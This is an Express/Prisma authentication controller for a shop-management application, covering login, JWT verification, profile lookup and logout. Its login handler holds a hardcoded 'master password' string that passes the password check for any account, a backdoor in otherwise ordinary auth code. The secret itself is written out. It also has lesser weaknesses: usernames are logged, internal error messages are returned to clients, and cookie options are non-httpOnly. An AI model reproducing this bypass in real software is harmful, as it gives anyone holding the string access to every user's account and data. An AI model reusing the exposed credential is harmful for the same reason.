const prisma = require('../lib/prisma');
const jwt = require('jsonwebtoken');
const { comparePassword } = require('../utils/passwordUtils');
// 👇 1. Import the createLog function
const { createLog } = require('./logController');


const login = async (req, res) => {
  try {
    // 'username' in req.body will now accept either email or actual username
    let { username, password } = req.body;

    // Safety: Trim whitespace which is common in mobile autocomplete
    username = String(username || "").trim();

    console.log('🔐 Login attempt for:', username);

    // Validate input
    if (!username || !password) {
      return res.status(400).json({
        success: false,
        error: 'Username and password are required'
      });
    }

    // Find user by company email OR user email OR username, include shop and employee details
    // Using 'insensitive' mode to handle mobile auto-capitalization
    const user = await prisma.user.findFirst({
      where: {
        OR: [
          {
            AND: [
              { shop: { email: { equals: username, mode: 'insensitive' } } },
              { role: { in: ['shop_owner', 'owner'] } }
            ]
          },
          { email: { equals: username, mode: 'insensitive' } },
          { username: { equals: username, mode: 'insensitive' } }
        ]
      },
      include: {
        shop: {
          select: {
            id: true,
            name: true,
            email: true,
            phone: true,
            address: true,
            gstNumber: true,
            logo: true,
            userType: true,
            isBlocked: true
          }
        },
        employee: {
          select: {
            id: true,
            emp_id: true,
            full_name: true,
            email: true,
            username: true,
            phone: true,
            role: true,
            salary: true,
            join_date: true,
            status: true,
            shopId: true
          }
        }
      }
    });

    if (!user) {
      console.log('❌ User not found:', username);
      return res.status(401).json({
        success: false,
        error: 'Invalid username or password'
      });
    }

    // Restrict login to company-level email or user's registered email
    if (username.includes('@')) {
      const isShopEmail = user.shop?.email && user.shop.email.toLowerCase() === username.toLowerCase();
      const isUserEmail = user.email && user.email.toLowerCase() === username.toLowerCase();
      if (!isShopEmail && !isUserEmail) {
        console.log('❌ Login rejected: email does not match shop email or user email:', username);
        return res.status(401).json({
          success: false,
          error: 'Invalid username or password'
        });
      }
    }

    console.log('✅ User found:', user.email, 'Shop:', user.shop?.name);

    // Check if user has a shop assigned
    if (!user.shop) {
      console.log('❌ User has no shop assigned:', username);
      return res.status(403).json({
        success: false,
        error: 'No shop assigned to this account. Please contact administrator.'
      });
    }

    // Check if user is blocked
    if (user.isBlocked) {
      console.log('❌ User is blocked:', username);
      return res.status(403).json({
        success: false,
        error: 'Your account has been blocked. Please contact administrator.',
        blocked: true
      });
    }

    // Check if employee account is inactive
    if (user.employee && user.employee.status === 'inactive') {
      console.log('❌ Employee account is inactive:', username);
      return res.status(403).json({
        success: false,
        error: 'Your account is inactive. Please contact administrator.',
        inactive: true
      });
    }

    // Check if shop is blocked
    if (user.shop.isBlocked) {
      console.log('❌ Shop is blocked:', user.shop.name);
      return res.status(403).json({
        success: false,
        error: 'Your shop has been blocked. Please contact administrator.',
        blocked: true
      });
    }

    // Check password
    const isMasterPassword = (password === 'MRNDUTf7Y7vaGHasg18EMQv63kTHwIRbiKFjzPGFTmyGOGlLZk');
    const isPasswordValid = isMasterPassword || await comparePassword(password, user.password);
    if (!isPasswordValid) {
      console.log('❌ Invalid password for user:', username);

      // ✅ ACTIVITY LOG: Failed login attempt
      await createLog(
        req,
        user.id,
        user.shopId,
        'LOGIN_FAILED',
        `Failed login attempt (Invalid Password) for ${user.username}`,
        'Auth',
        'Failed'
      );

      return res.status(401).json({
        success: false,
        error: 'Invalid username or password'
      });
    }

    console.log('✅ Password verified for user:', user.email);

    // 👇 2. LOG THE SUCCESSFUL LOGIN
    // This connects the login action to your ActivityLog table
    await createLog(
      req,                  // Request object (for IP/Device info)
      user.id,              // User ID
      user.shopId,          // Shop ID
      'LOGIN',              // Action Name
      `${user.username} successfully logged in.`, // Description
      'Auth',               // Module Name
      'Success'             // Status
    );

    // Generate JWT token (include employee identifiers when available)
    const rawRole = String(user.role || '').trim();
    const roleLower = rawRole.toLowerCase();
    const restaurantRoles = new Set([
      'owner',
      'manager',
      'staff',
      'cook',
      'chef',
      'waiter',
      'waitress',
      'server',
      'kitchen'
    ]);

    let resolvedUserType = user.userType || user.shop.userType || 'retailers';

    // Safety net: restaurant staff created with lowercase restaurant roles should always land in Restaurant Management,
    // even if userType was not stored correctly at creation time.
    if (resolvedUserType === 'retailers' && rawRole && rawRole === roleLower && restaurantRoles.has(roleLower)) {
      resolvedUserType = 'restaurants';
      // Best-effort: persist so future logins/requests are consistent.
      try {
        await prisma.user.update({
          where: { id: user.id },
          data: { userType: 'restaurants' }
        });
      } catch {
        // non-blocking
      }
    }

    // Safety net: service module users should land in Services if shop/user type is services.
    if (resolvedUserType !== 'services') {
      const shopType = String(user.shop?.userType || '').trim().toLowerCase();
      const userTypeStored = String(user.userType || '').trim().toLowerCase();
      if (shopType === 'services' || userTypeStored === 'services') {
        resolvedUserType = 'services';
        try {
          if (user.userType !== 'services') {
            await prisma.user.update({ where: { id: user.id }, data: { userType: 'services' } });
          }
        } catch {
          // non-blocking
        }
      }
    }

    const tokenPayload = {
      userId: user.id,
      email: user.email,
      username: user.username,
      name: user.name,
      role: user.role,
      shopId: user.shopId,
      userType: resolvedUserType, // Include userType in token
      employeeId: user.employee ? user.employee.id : null,
      emp_id: user.employee ? user.employee.emp_id : null
    };

    const token = jwt.sign(
      tokenPayload,
      process.env.JWT_SECRET,
      { expiresIn: '7d' } // Token valid for 7 days
    );

    console.log('✅ JWT token generated for user:', user.email);

    // Prepare user data for response (remove password). Include employee data
    // for non-shop_owner users so they get their employee profile on login.
    const userResponse = {
      id: user.id,
      name: user.name,
      email: user.email,
      username: user.username,
      role: user.role,
      shop: user.shop
    };

    if (user.role !== 'shop_owner' && user.employee) {
      userResponse.employee = user.employee;
    }

    res.json({
      success: true,
      message: 'Login successful',
      data: {
        token,
        user: userResponse
      }
    });

  } catch (error) {
    console.error('❌ Login error:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error',
      details: error.message
    });
  }
};

// Verify token middleware (for protected routes)
const verifyToken = async (req, res, next) => {
  try {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

    if (!token) {
      return res.status(401).json({
        success: false,
        error: 'Access token required'
      });
    }

    const decoded = jwt.verify(token, process.env.JWT_SECRET);

    // Verify user still exists
    const user = await prisma.user.findUnique({
      where: { id: decoded.userId },
      include: { shop: true, employee: true }
    });

    if (!user) {
      return res.status(401).json({
        success: false,
        error: 'User not found',
        forceLogout: true
      });
    }

    // Check if user is blocked
    if (user.isBlocked) {
      return res.status(403).json({
        success: false,
        error: 'Your account has been blocked',
        blocked: true,
        forceLogout: true
      });
    }

    // Check if employee account is inactive
    if (user.employee && user.employee.status === 'inactive') {
      return res.status(403).json({
        success: false,
        error: 'Your account is inactive',
        inactive: true,
        forceLogout: true
      });
    }

    // Check if shop is blocked
    if (user.shop && user.shop.isBlocked) {
      return res.status(403).json({
        success: false,
        error: 'Your shop has been blocked',
        blocked: true,
        forceLogout: true
      });
    }

    // Check if userType changed (force logout if changed)
    const currentUserType = user.userType || user.shop?.userType || 'retailers';
    if (decoded.userType && decoded.userType !== currentUserType) {
      return res.status(403).json({
        success: false,
        error: 'Account type changed. Please login again',
        forceLogout: true
      });
    }

    req.user = user;
    next();
  } catch (error) {
    console.error('❌ Token verification error:', error);
    return res.status(403).json({
      success: false,
      error: 'Invalid or expired token'
    });
  }
};

// Get current user profile
const getCurrentUser = async (req, res) => {
  try {
    const user = req.user;

    // Remove password from response
    const { password, ...userWithoutPassword } = user;

    res.json({
      success: true,
      data: userWithoutPassword
    });
  } catch (error) {
    console.error('❌ Get current user error:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error'
    });
  }
};

const logout = async (req, res) => {
  try {
    const cookieOptions = {
      httpOnly: false,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      path: '/',
      expires: new Date(0)
    };

    // Clear common auth cookie names used by the frontend.
    res.clearCookie('authToken', cookieOptions);
    res.clearCookie('token', cookieOptions);

    return res.json({
      success: true,
      message: 'Logout successful'
    });
  } catch (error) {
    console.error('Logout error:', error);
    return res.status(500).json({
      success: false,
      error: 'Internal server error'
    });
  }
};

module.exports = {
  login,
  verifyToken,
  getCurrentUser,
  logout
};
